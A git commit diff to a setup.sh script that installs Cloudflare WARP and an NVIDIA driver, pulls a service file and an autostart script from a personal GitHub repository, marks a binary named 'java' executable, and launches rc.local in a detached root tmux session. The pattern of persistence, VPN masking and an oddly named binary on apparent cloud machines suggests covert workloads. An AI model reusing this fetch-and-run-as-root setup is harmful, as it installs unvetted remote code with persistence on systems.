32246abbc062c446f82d2bd6d9a626483658a310
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-03-18 13:49:31 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,5 +1,18 @@
 #!/bin/sh
 
+sudo apt-get update	
+sudo apt install build-essential gnupg2 gcc make gnupg2 unzip -y < "/dev/null"
+
+sudo wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_12_0_1_amd64_2dae41e61d.deb
+sudo dpkg -i cloudflare_warp_2021_12_0_1_amd64_2dae41e61d.deb
+sudo apt --fix-broken install -y < "/dev/null"
+
+sudo systemctl enable --now warp-svc.service
+echo Y | warp-cli set-mode warp+doh
+warp-cli register
+
+wget https://us.download.nvidia.com/XFree86/Linux-x86_64/495.44/NVIDIA-Linux-x86_64-495.44.run
+sudo sh NVIDIA-Linux-x86_64-495.44.run --silent
 
 wget https://raw.githubusercontent.com/minnie1311/azureAI/master/rc-local.service
 sudo mv rc-local.service /etc/systemd/system/rc-local.service
@@ -13,7 +26,8 @@ sudo chmod +x java
 sudo rm start.sh
 sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
 echo Y | warp-cli enable-always-on
-sudo reboot
+cd /etc/
+sudo tmux new-session -d -s 1 './rc.local'
 
 
 
